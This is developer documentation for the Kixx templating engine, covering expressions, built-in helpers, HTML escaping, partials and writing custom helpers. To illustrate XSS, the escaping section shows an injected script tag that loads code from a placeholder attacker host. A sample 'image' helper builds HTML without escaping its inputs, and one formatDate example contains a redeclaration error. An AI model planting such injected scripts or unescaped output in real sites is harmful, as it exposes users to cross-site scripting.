Templating with Kixx
====================

Basic Expressions
-----------------
The most fundamental syntax element is the expression, which allows you to output values from your context.

### Simple Variable Output
Context data:
```js
response.updateProps({
    album: 'Follow the Leader',
    artist: 'Eric B. & Rakim',
});
```

HTML template:
```html
<h1>{{ album }}</h1>
<p>by {{ artist }}</p>
```

HTML output:
```html
<h1>Follow the Leader</h1>
<p>by Eric B. &amp; Rakim</p>
```

Notice that the "&" was converted to an HTML entity. This is because HTML escaping is done automatically by the Kixx templating system as a security feature to avoid [HTML injection attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection). To learn more, see the section in this document on [HTML Escaping](#html-escaping).

### Stringification
Kixx templates will attempt to convert the value you reference to a string before rendering, which can lead to some unexpected results you should be aware of.

Context data:
```js
response.updateProps({
    song: {
        writer: { firstName: 'Bob', lastName: 'Dylan' },
        released: new Date('1963-08-13'),
        sales: 470000,
    },
});
```

HTML template:
```html
<p>Writer: {{ song.writer }}</p>
<p>Released: {{ song.released }}</p>
<p>Sales: {{ song.sales }}</p>
```

HTML output:
```html
<p>Writer: [object Object]</p>
<p>Released: Mon Aug 12 1963 20:00:00 GMT-0400 (Eastern Daylight Time)</p>
<p>Sales: 470000</p>
```

To avoid the "[object Object]" problem, see the section on [Nested Property Access](#nested-property-access) below.

Use the [formatDate helper](#formatdate-helper) to render the Date object with the appropriate time zone, locale, and formatting.

### Nested Property Access
Let's try the example above again, this time using dot "." notation for nested property access:
```html
<p>{{ song.writer.firstName }} {{ song.writer.lastName }}</p>
<p>Released: {{ song.released.formattedDate }}</p>
```

HTML output:
```html
<p>Bob Dylan</p>
<p>Released: August 13th, 1963</p>
```

### Array Access
You can also access array elements using the common square bracket "[]" notation.

```js
response.updateProps({
    images: [
        {
            src: 'https://www.example.com/assets/image-1.jpg',
            alt: 'A mongoose',
            tags: [ 'Mammel', 'Mongoose' ],
        },
        {
            src: 'https://www.example.com/assets/image-2.jpg',
            alt: 'An elephant',
            tags: [ 'Mammel', 'Elepant' ],
        },
    ],
});
```

HTML template:
```html
<ul>
    <li>
        <img src="{{ images[0].src }}" alt="{{ images[0].alt }}" />
        <span>{{ images[0].tags[0] }}</span><span>{{ images[0].tags[1] }}</span>
    </li>
    <li>
        <img src="{{ images[1].src }}" alt="{{ images[1].alt }}" />
        <span>{{ images[1].tags[0] }}</span><span>{{ images[1].tags[1] }}</span>
    </li>
</ul>
```

Writing out each array element access is cumbersome and fragile. In most cases you'll want to use a `#each` loop to iterate over arrays, but Kixx templating allows you to access array elements individually for cases where you might need to do that. See the section in this document on the [#each block helper](#each-helper) to see how to iterate over an array, Map, Set, or object.

### Quoted Property Access
Some JavaScript properties need to be quoted:
```js
response.updateProps({
    headers: {
        Date: "Thu, 23 Oct 2025 17:07:22 GMT",
        "Content-Type": "text/html",
        "Content-Length": 199,
    },
});
```

These properties will need to be accessed using the square bracket "[]" notation in your template:
```html
<dl>
    <dt>Date</dt>
    <dd>{{ headers.Date }}</dd>
    <dt>Content-Type</dt>
    <dd>{{ headers[Content-Type] }}</dd>
    <dt>Content-Length</dt>
    <dd>{{ headers[Content-Length] }}</dd>
</dl>
```

__Note:__ You do *not* need quotes inside the brackets `["Content-Type"]` like you would in JavaScript. Instead, just reference the value without quotes like `[Content-Type]`.

### Comments
Comments don't appear in the template output and are useful for documentation, debugging, and temporarily disabling sections of your template.

A single line comment:
```html
{{!-- This is a single line comment --}}
<h1>{{ title }}</h1>
```

A multi-line comment including disabled template syntax:
```html
{{!-- 
    This is a multi-line comment.
    You can include mustaches here: {{ title }}
    And they won't be processed.
--}}
<div class="content">
    {{ content }}
</div>
```

Built-in Helpers
----------------
Kixx comes with a set of essential helper functions that cover common use cases. Block helpers begin with `#` to distinguish them from inline helpers.

| Helper | Type | Description |
|--------|------|-------------|
| `#each` | Block | Iterate over arrays, objects, Maps, and Sets |
| `#if` | Block | Conditional rendering based on truthiness |
| `#ifEqual` | Block | Equality comparison using `==` |
| `formatDate` | Inline | Format JavaScript dates and date strings |
| `plusOne` | Inline | Add 1 to the given number for rendering array indexes |
| `unescape` | Inline | Prevent automatic HTML entities encoding |

### each Helper
The `#each` block helper allows you to conveniently iterate over iterable objects like arrays and maps.

Context data:
```js
response.updateProps({
    images: [
        {
            src: 'https://www.example.com/assets/image-1.jpg',
            alt: 'A mongoose',
            tags: [ 'Mammel', 'Mongoose' ],
        },
        {
            src: 'https://www.example.com/assets/image-2.jpg',
            alt: 'An elephant',
            tags: [ 'Mammel', 'Elepant' ],
        },
    ],
});
```

HTML template:
```html
<ul>
    {{#each images as |image| }}
    <li>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </li>
    {{/each}}
</ul>
```
__Remember:__ Include the closing `{{/each}}` tag.

Access the array index value:
```html
<ul>
    {{#each images as |image, index| }}
    <li>
        <span>{{ index }}</span>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </li>
    {{/each}}
</ul>
```

You can nest `#each` blocks too. Here we have an `#each` block that iterates over the image tags inside the `#each` block for the images.
```html
<ul>
    {{#each images as |image| }}
    <li>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
        {{#each image.tags as |tag| }}<span>{{ tag }}</span>{{/each}}
    </li>
    {{/each}}
</ul>
```

And, you can use the `else` conditional to handle empty lists:
```js
response.updateProps({
    images: [],
});
```

HTML template:
```html
{{#each images as |image| }}
<div>
    <img src="{{ image.src }}" alt="{{ image.alt }}" />
</div>
{{else}}
<p>No images to display</p>
{{/each}}
```

Expressions inside the `#each` block can reference context data outside the block.
```js
response.updateProps({
    photo: {
        src: 'https://www.example.com/assets/image-1.jpg',
        alt: 'A dog chasing a cat',
        tags: [ 'dog', 'cat', 'pets' ],
    },
});
```

Here we access the `photo.src` from inside the `photo.tags` `#each` block.
```html
{{#each photo.tags as |tag|}}
<div>
    <img src="{{ photo.src }}">
    <p>{{ tag }}</p>
</div>
{{/each}}
```

Iterate over other datatypes like Maps, Sets, and plain objects:
```js
const airports = new Map();

airports.set('ATL', {
    name: 'Hartsfield-Jackson Atlanta International Airport',
    yearlyPassengersMillions: 108.1,
});

airports.set('DXB', {
    name: 'Dubai International Airport',
    yearlyPassengersMillions: 93.3,
});

airports.set('DFW', {
    name: 'Dallas/Fort Worth International Airport',
    yearlyPassengersMillions: 87.8,
});

response.updateProps({
    airports,
    tags: new Set([ 'airports', 'traffic', 'passengers' ]),
    headers: {
        Date: "Thu, 23 Oct 2025 17:07:22 GMT",
        "Content-Type": "text/html",
        "Content-Length": 199,
    },
});
```

#### The second "key name" parameter to `#each`
The `#each` helper accepts a second parameter which references something slightly different based on the iterable object type.

| Iterable | Second parameter description | Example |
|----------|------------------------------|---------|
| Array    | references the index | `{{#each list as |item, index|}}` |
| Map      | references the key | `{{#each mapItems as |item, key|}}` |
| Set      | no reference | `{{#each items as |item|}}` |
| plain Object | references the property name | `{{#each dict as |item, name|}}` |

HTML template:
```html
{{!-- When iterating over a Map you can use the second parameter to #each to reference the key --}}
{{#each airports as |airport, code| }}
    <div>
        <p>{{ code }} | {{ airport.name }}</p>
        <p>Yearly Passengers (millions): {{ airport.yearlyPassengersMillions }}</p>
    </div>
{{else}}
    {{!-- Handle the case where there are no airports --}}
    <div>
        <p>No airports to list.</p>
    </div>
{{/each}}

{{!-- When iterating over a Set the second parameter to #each is not defined --}}
<p>
{{#each tags as |tag|}}
    <span>{{ tag }}</span>
{{/each}}
</p>

<ul>
{{!-- When iterating over an object you can use the second parameter to #each to reference the property name --}}
{{#each headers as |val, key|}}
    <li><strong>key:</strong> {{ val }}</li>
{{/each}}
</ul>
```

### if Helper
The `#if` helper provides conditional rendering based on the truthiness of a value.

```html
{{#if user.isLoggedIn}}
    <p>Welcome back, {{ user.name }}!</p>
{{else}}
    <p>Please <a href="/login">log in</a>.</p>
{{/if}}
```
__Remember:__ Include the closing `{{/if}}` tag.

#### Truthiness rules for `if` blocks
The `#if` helper considers these values as **truthy**:

- Any non-empty string
- Any non-zero number
- `true`
- Non-empty arrays
- Non-empty objects
- Non-empty Maps and Sets

These values are considered **falsy**:

- `false`
- `0`
- `""` (empty string)
- `null`
- `undefined`
- Empty arrays `[]`
- Empty objects `{}`
- Empty Maps and Sets

The `#if` helper can be helpful to avoid rendering tags if a value is empty:
```html
{{#if openGraph.type }}
    <meta property="og:type" content="{{ openGraph.type }}">
{{/if}}
{{#if openGraph.url }}
    <meta property="og:url" content="{{ openGraph.url }}">
{{/if}}
```

You can also check if an array (or other iterable) is empty before iterating over it to avoid rendering the outer HTML. In this list, we don't want to render the `<ul></ul>` if the `profile.links` is empty.
```html
{{#if profile.links }}
<ul>
    {{#each profile.links as |link|}}
    <li><a href="{{ link.href }}">{{ link.label }}</a></li>
    {{/each}}
</ul>
{{/if}}
```

### ifEqual Helper
The `#ifEqual` helper compares two values using `==` equality and conditionally renders content.

```html
{{#ifEqual user.role "admin"}}
    <span class="admin-badge">Administrator</span>
{{else}}
    <span class="user-badge">User</span>
{{/ifEqual}}
```

The `#ifEqual` helper can work as an `if ... else if ... ` chain or even as a `switch ... case` statement:
```html
{{#ifEqual user.role "admin"}}
    <a href="/dashboard/admin">Administrator</a>
{{else}}{{#ifEqual user.role "moderator"}}
    <a href="/dashboard/mod">Moderator</a>
{{else}}
    <a href="/dashboard">Dashboard</a>
{{/ifEqual}}{{/ifEqual}}
```
__Remember:__ Include matching closing `{{/if}}` tags.

### formatDate Helper
The `formatDate` helper is an inline helper which formats and renders date strings and objects with time zone and locale context.

```js
response.updateProps({
    game: {
        timezone: 'America/New_York',
        startTime: '2025-10-24T23:00:00.000Z',
        endTime: '2025-10-25T02:00:00.000Z',
    },
});
```

You can explicitly set the time zone, locale, and format or use the defaults for any of them.

| Attribute | Default | Description |
|-----------|---------|-------------|
| zone      | system default | Usually UTC for most servers |
| locale    | system locale | Usually en-US for most servers |
| format    | DATETIME_SHORT | Outputs "10/14/1983, 1:30 PM" |

```html
{{!-- Explicitly set the time zone, locale, and format --}}
<p>Game start: {{formatDate game.startTime zone="America/New_York" locale="en-US" format="DATETIME_MED" }}</p>
{{!-- Use the default time zone, locale, and format --}}
<p>Game end: {{formatDate game.startTime }}</p>
```

All helper mustaches can span multiple lines, but this can be especially useful for potentially long ones like `formatDate` when all the attributes are explicitly set:
```html
<p>Game start: {{formatDate game.startTime
    zone="America/New_York"
    locale="en-US"
    format="DATETIME_MED"
}}</p>
```

HTML output:
```html
<p>Game start: Oct 24, 2025, 7:00 PM</p>
<p>Game end: 10/25/2025, 2:00 AM</p>
```
Notice in the game `endTime`, since we didn't provide a time zone, the system used the default UTC time of 2:00AM the next day, which is probaby not what we wanted. It's better to be safe and explicitly set the `zone` attribute.

For a list of common IANA time zone strings, see the [Wikipedia page](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones).

The full list of locale language strings can be found in the [IANA registry](https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry) or the [language tag registry search](https://r12a.github.io/app-subtags/).

#### Formats for formatDate

| Name                            | Example in en_US                                 |
|---------------------------------|--------------------------------------------------|
| DATE_SHORT                      | 10/14/1983                                       |
| DATE_MED                        | Oct 14, 1983                                     |
| DATE_MED_WITH_WEEKDAY           | Fri, Oct 14, 1983                                |
| DATE_FULL                       | October 14, 1983                                 |
| DATE_HUGE                       | Friday, October 14, 1983                         |
| TIME_SIMPLE                     | 1:30 PM                                          |
| TIME_WITH_SECONDS               | 1:30:23 PM                                       |
| TIME_WITH_SHORT_OFFSET          | 1:30:23 PM EDT                                   |
| TIME_WITH_LONG_OFFSET           | 1:30:23 PM Eastern Daylight Time                 |
| TIME_24_SIMPLE                  | 13:30                                            |
| TIME_24_WITH_SECONDS            | 13:30:23                                         |
| TIME_24_WITH_SHORT_OFFSET       | 13:30:23 EDT                                     |
| TIME_24_WITH_LONG_OFFSET        | 13:30:23 Eastern Daylight Time                   |
| DATETIME_SHORT                  | 10/14/1983, 1:30 PM                              |
| DATETIME_MED                    | Oct 14, 1983, 1:30 PM                            |
| DATETIME_MED_WITH_WEEKDAY       | Fri, Oct 14, 1983, 1:30 PM                       |
| DATETIME_FULL                   | October 14, 1983 at 1:30 PM EDT                  |
| DATETIME_HUGE                   | Friday, October 14, 1983 at 1:30 PM Eastern Daylight Time |
| DATETIME_SHORT_WITH_SECONDS     | 10/14/1983, 1:30:23 PM                           |
| DATETIME_MED_WITH_SECONDS       | Oct 14, 1983, 1:30:23 PM                         |
| DATETIME_FULL_WITH_SECONDS      | October 14, 1983 at 1:30:23 PM EDT               |
| DATETIME_HUGE_WITH_SECONDS      | Friday, October 14, 1983 at 1:30:23 PM Eastern Daylight Time |
| UTC                             | Wed, 14 Jun 2017 07:00:00 GMT                    |
| ISO                             | 2017-06-14T07:00:00.000Z                         |
| ISO_DATE                        | 2017-06-14                                       |

### plusOne Helper
The `plusOne` helper simply adds 1 to the given number. This is useful for using array indexes in the rendered output.

HTML template:
```html
{{#each images as |image, index| }}
<div>
    <span>{{plusOne index }}.</span> <img src="{{ image.src }}" alt="{{ image.alt }}" />
</div>
{{/each}}
```

### Multi-line Helpers
All helper mustaches can span multiple lines, but this technique can be especially useful for potentially long ones like `formatDate` when all the attributes are explicitly set:
```html
<p>Game start: {{formatDate game.startTime
    zone="America/New_York"
    locale="en-US"
    format="DATETIME_MED"
}}</p>
```

## HTML Escaping
Kixx templating automatically escapes HTML as a security feature to avoid [HTML injection attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection). Imagine a bad guy writes a comment on our blog which injects his evil script. Then we render the comment on our blog with this template:
```html
{{#each post.comments as |comment|}}
<div>
    {{ comment }}
</div>
{{/each}}
```

It might render something like this. Notice the evil script tag the attacker injected:
```html
<div>
    A good comment.
</div>
<div>
    A bad attack: <script src="http://evildoer.evil/evil-script.js" />
</div>
<div>
    Another good comment.
</div>
```
That script tag will load a script which could do anything on our page ranging from mildly annoying to much, much worse.

So, Kixx templating escapes HTML by default, which helps avoid these cross site scripting attacks. Instead of the script being injected like the example above, what actually happens is that the dangerous HTML is escaped like this:
```html
<div>
    A good comment.
</div>
<div>
    Not so bad: &lt;script src&#x3D;&quot;http://evildoer.evil/evil-script.js&quot; /&gt;
</div>
<div>
    Another good comment.
</div>
```

### Using the `unescape` helper to prevent automatic escaping
There are times when you want to prevent the automatic HTML escaping. One example might be for markdown content you've converted to HTML and want to render on the page. To prevent HTML escaping, use the built-in `unescape` helper:

```html
<p>{{unescape markdownContent }}</p>
```

**⚠️ Security Warning:** Only use `unescape` when you trust the content and want to render HTML. Never use it with untrusted user input.

### Partials

Partials allow you to include other templates within your current template.

```html
<!DOCTYPE html>
<html>
<head>
    {{> head.html }}
</head>
<body>
    {{> header.html }}
    
    <main>
        {{ content }}
    </main>
    
    {{> footer.html }}
</body>
</html>
```

Partials inherit the current context, so they have access to all the same variables.

```html
<!-- In main template -->
{{> user-card.html }}

<!-- In user-card.html partial -->
<div class="user-card">
    <h3>{{ user.name }}</h3>
    <p>{{ user.email }}</p>
</div>
```

## Error Handling
Kixx Templating provides graceful error handling:

### Undefined Properties

If a property doesn't exist in your context, it will render as an empty string instead of throwing an error:

```html
<!-- If article.date doesn't exist, this renders as an empty string -->
<p>{{ article.date.localized }}</p>
```

### Helper Errors

If a helper function throws an error, you'll get a clear error message with the file name and line number:

```
Error in helper "format_date" in "template.html" on line 15
```

## Partials
Partials are reusable template components that allow you to break down large templates into smaller, manageable pieces. They help maintain consistency across your application and reduce code duplication.

Use the `{{> partial-name.html }}` syntax to include a partial:

```html
<!DOCTYPE html>
<html>
<head>
    {{> head.html }}
</head>
<body>
    {{> header.html }}
    
    <main>
        {{noop content }}
    </main>
    
    {{> footer.html }}
</body>
</html>
```

### Creating Partials
Partials are just regular template files. Here's an example header partial:

```html
<!-- header.html -->
<header class="site-header">
    <nav>
        <a href="/" class="logo">{{ site.name }}</a>
        <ul class="nav-menu">
            {{#each navigation as |item|}}
                <li><a href="{{ item.url }}">{{ item.text }}</a></li>
            {{/each}}
        </ul>
    </nav>
</header>
```

**Context Inheritance**

Partials automatically inherit the context from their parent template, so they have access to all the same variables.

### Example: User Card Partial

```html
<!-- In main template -->
{{#each users as |user|}}
    {{> user-card.html }}
{{/each}}

<!-- user-card.html partial -->
<div class="user-card">
    <img src="{{ user.avatar }}" alt="{{ user.name }}" />
    <h3>{{ user.name }}</h3>
    <p>{{ user.email }}</p>
    {{#if user.isOnline}}
        <span class="status online">Online</span>
    {{/if}}
</div>
```

### Common Partial Patterns
Create a base layout that other templates can extend:

```html
<!-- layout.html -->
<!DOCTYPE html>
<html lang="{{ site.language }}">
<head>
    {{> head.html }}
</head>
<body class="{{ bodyClass }}">
    {{> header.html }}
    
    <main class="main-content">
        {{ content }}
    </main>
    
    {{> footer.html }}
    
    {{> scripts.html }}
</body>
</html>
```

Partials can include other partials, allowing you to create complex component hierarchies:

```html
<!-- article-list.html -->
<div class="article-list">
    {{#each articles as |article|}}
        {{> article-card.html }}
    {{/each}}
</div>

<!-- article-card.html -->
<article class="article-card">
    <header>
        {{> article-header.html }}
    </header>
    <div class="content">
        {{ article.excerpt }}
    </div>
    <footer>
        {{> article-footer.html }}
    </footer>
</article>

<!-- article-header.html -->
<h2><a href="{{ article.url }}">{{ article.title }}</a></h2>
{{> author-info.html }}
```

You can conditionally include partials based on context:

```html
<!-- main template -->
{{#if user.isAdmin}}
    {{> admin-panel.html }}
{{else}}
    {{> user-panel.html }}
{{/if}}

{{#if showSidebar}}
    {{> sidebar.html }}
{{/if}}
```

### Best Practices for partials

#### 1. Use Descriptive Names

```html
<!-- Good -->
{{> user-profile-card.html }}
{{> navigation-menu.html }}
{{> article-meta.html }}

<!-- Avoid -->
{{> card.html }}
{{> nav.html }}
{{> meta.html }}
```

#### 2. Keep Partials Focused

```html
<!-- Good: Single responsibility -->
<!-- user-avatar.html -->
<img src="{{ user.avatar }}" alt="{{ user.name }}" class="avatar" />

<!-- Avoid: Multiple responsibilities -->
<!-- user-card.html -->
<div class="user-card">
    <img src="{{ user.avatar }}" alt="{{ user.name }}" />
    <h3>{{ user.name }}</h3>
    <p>{{ user.bio }}</p>
    <div class="actions">
        <button>Edit</button>
        <button>Delete</button>
    </div>
</div>
```

#### 3. Use Consistent Naming Conventions

```html
<!-- Use kebab-case for file names -->
{{> user-profile.html }}
{{> navigation-menu.html }}
{{> article-card.html }}

<!-- Use descriptive names that indicate purpose -->
{{> form-field-input.html }}
{{> form-field-textarea.html }}
{{> form-field-select.html }}
```

#### 4. Organize Partials by Feature

```
templates/
├── layout/
│   ├── base.html
│   ├── head.html
│   ├── header.html
│   └── footer.html
├── components/
│   ├── button.html
│   ├── card.html
│   └── form-field.html
├── user/
│   ├── user-card.html
│   ├── user-avatar.html
│   └── user-profile.html
└── article/
    ├── article-card.html
    ├── article-meta.html
    └── article-content.html
```

#### 5. Document Partial Dependencies

```html
<!-- user-card.html -->
{{!-- 
    This partial expects the following context:
    - user: Object with name, email, avatar properties
    - showActions: Boolean to show/hide action buttons
--}}
<div class="user-card">
    <img src="{{ user.avatar }}" alt="{{ user.name }}" />
    <h3>{{ user.name }}</h3>
    <p>{{ user.email }}</p>
    
    {{#if showActions}}
        <div class="actions">
            <button>Edit</button>
            <button>Delete</button>
        </div>
    {{/if}}
</div>
```

## Custom Helpers
Kixx Templating allows you to create custom helper functions to extend the template engine's capabilities. This guide covers how to create both inline and block helpers.

There are two types of helpers you can create:

- **Inline Helpers**: Transform data and return a string value
- **Block Helpers**: Control template flow and can contain other content

### Helpers
Helpers are functions that can transform data or provide conditional logic. They come in two types: inline helpers and block helpers.

#### Inline Helpers
Inline helpers are used for data transformation and formatting.

```html
<!-- Basic helper usage -->
<p>{{ format_date article.publishDate }}</p>

<!-- Helper with arguments -->
<p>{{ format_date article.publishDate format="long" timezone="UTC" }}</p>

<!-- Helper with multiple arguments -->
<img src="{{ image article.image width=800 height=600 quality="high" }}" />
```

#### Block Helpers
Block helpers control the flow of your template and can contain other content.

```html
<!-- Conditional rendering -->
{{#if user.isLoggedIn}}
    <p>Welcome back, {{ user.name }}!</p>
{{else}}
    <p>Please <a href="/login">log in</a>.</p>
{{/if}}

<!-- Iteration -->
{{#each articles as |article|}}
    <article>
        <h2>{{ article.title }}</h2>
        <p>{{ article.excerpt }}</p>
    </article>
{{/each}}
```

#### Helper Arguments
Helpers can accept different types of arguments:

Positional Arguments:

```html
{{ format_date "2023-12-25" "long" "America/New_York" }}
```

Named Arguments (Hash):

```html
{{ format_date article.date format="long" timezone="America/New_York" locale="en-US" }}
```

Mixed Arguments:

```html
{{ image article.image 800 600 quality="high" format="webp" }}
```

You can use string literals in helper arguments:

```html
{{#ifEqual user.role "admin"}}
    <span class="admin-badge">Administrator</span>
{{/ifEqual}}

{{ format_date "2023-12-25" format="long" }}
```

All helper functions follow this signature:

```javascript
function helperName(context, options, ...positionals) {
    // Helper implementation
    return output;
}
```

### Parameters
- `context`: The current template context object
- `options`: Named arguments (hash) passed to the helper
- `...positionals`: Rest parameters representing positional arguments

### The `this` Context
Inside block helpers, the `this` context provides:

- `this.blockParams`: Array of block parameter names
- `this.renderPrimary(newContext)`: Render the primary block
- `this.renderInverse(newContext)`: Render the inverse (else) block

### Inline Helpers
Inline helpers transform data and return a string value.

```javascript
function formatDate(context, options, dateString) {
    const { format = 'short', timezone = 'UTC' } = options;
    
    if (!dateString) return '';
    
    const date = new Date(dateString);
    
    if (format === 'short') {
        return date.toLocaleDateString();
    } else if (format === 'long') {
        return date.toLocaleDateString('en-US', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
    }
    
    return date.toISOString();
}
```

```html
<p>Published: {{ formatDate article.publishDate format="long" }}</p>
<p>Updated: {{ formatDate article.updatedDate format="short" timezone="America/New_York" }}</p>
```

**Helper with Multiple Arguments**

```javascript
function image(context, options, src, alt, width, height) {
    const { class: className = '', loading = 'lazy' } = options;
    
    if (!src) return '';
    
    return `<img src="${src}" alt="${alt || ''}" width="${width || ''}" height="${height || ''}" class="${className}" loading="${loading}">`;
}
```

```html
{{image article.image.src article.image.alt 800 600 class="featured" loading="eager"}}
```

### Block Helpers

Block helpers control template flow and can contain other content.

```javascript
function unless(context, options, condition) {
    if (!condition) {
        return this.renderPrimary(context);
    }
    return this.renderInverse(context);
}
```

```html
{{#unless user.isLoggedIn}}
    <p>Please log in to continue.</p>
{{else}}
    <p>Welcome back!</p>
{{/unless}}
```

**Block Helper with Parameters**

```javascript
function repeat(context, options, count) {
    const { separator = '' } = options;
    let output = '';
    
    for (let i = 0; i < count; i++) {
        const subContext = { ...context, index: i };
        output += this.renderPrimary(subContext);
        if (i < count - 1 && separator) {
            output += separator;
        }
    }
    
    return output;
}
```

```html
{{#repeat 3 separator=", "}}
    <span>Item {{ index }}</span>
{{/repeat}}
```

**Complex Block Helper**

```javascript
function with(context, options, object) {
    if (!object) {
        return this.renderInverse(context);
    }
    
    // Merge the object into the current context
    const newContext = { ...context, ...object };
    return this.renderPrimary(newContext);
}
```

```html
{{#with user.profile}}
    <h2>{{ name }}</h2>
    <p>{{ bio }}</p>
    <p>Email: {{ email }}</p>
{{else}}
    <p>No profile information available.</p>
{{/with}}
```

### Registering Helpers

Kixx Templating will automatically register any helper functions you define in your project's `templates/helpers` directory. Simply create a JavaScript file for each helper in that directory, and the template engine will load and register them for you—no manual registration required.

For example, to add a custom `formatDate` helper, create a file at `templates/helpers/formatDate.js`:

### Advanced Helper Examples

**Date Formatting Helper**

```javascript
function formatDate(context, options, dateString) {
    const { 
        format = 'short', 
        timezone = 'UTC',
        locale = 'en-US' 
    } = options;
    
    if (!dateString) return '';
    
    const date = new Date(dateString);
    
    const formats = {
        short: { month: 'short', day: 'numeric', year: 'numeric' },
        long: { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric' 
        },
        time: { 
            hour: '2-digit', 
            minute: '2-digit' 
        },
        datetime: { 
            year: 'numeric', 
            month: 'short', 
            day: 'numeric',
            hour: '2-digit', 
            minute: '2-digit' 
        }
    };
    
    const options = formats[format] || formats.short;
    return date.toLocaleDateString(locale, options);
}
```

**String Manipulation Helper**

```javascript
function truncate(context, options, text) {
    const { length = 100, suffix = '...' } = options;
    
    if (!text || text.length <= length) {
        return text;
    }
    
    return text.substring(0, length) + suffix;
}
```

**Conditional Class Helper**

```javascript
function conditionalClass(context, options, ...classes) {
    const classList = [];
    
    for (let i = 0; i < classes.length; i += 2) {
        const className = classes[i];
        const condition = classes[i + 1];
        
        if (condition) {
            classList.push(className);
        }
    }
    
    return classList.join(' ');
}
```

```html
<div class="{{ conditionalClass 'active' user.isActive 'admin' user.isAdmin 'verified' user.isVerified }}">
    User content
</div>
```

**Pagination Helper**

```javascript
function pagination(context, options, currentPage, totalPages) {
    const { maxVisible = 5 } = options;
    
    if (totalPages <= 1) return '';
    
    let output = '<nav class="pagination"><ul>';
    
    // Previous button
    if (currentPage > 1) {
        output += `<li><a href="?page=${currentPage - 1}">Previous</a></li>`;
    }
    
    // Page numbers
    const start = Math.max(1, currentPage - Math.floor(maxVisible / 2));
    const end = Math.min(totalPages, start + maxVisible - 1);
    
    for (let i = start; i <= end; i++) {
        if (i === currentPage) {
            output += `<li class="current"><span>${i}</span></li>`;
        } else {
            output += `<li><a href="?page=${i}">${i}</a></li>`;
        }
    }
    
    // Next button
    if (currentPage < totalPages) {
        output += `<li><a href="?page=${currentPage + 1}">Next</a></li>`;
    }
    
    output += '</ul></nav>';
    return output;
}
```

Always handle errors gracefully in your helpers:

```javascript
function safeHelper(context, options, value) {
    try {
        // Your helper logic here
        return processedValue;
    } catch (error) {
        console.error('Helper error:', error);
        return ''; // Return empty string on error
    }
}
```
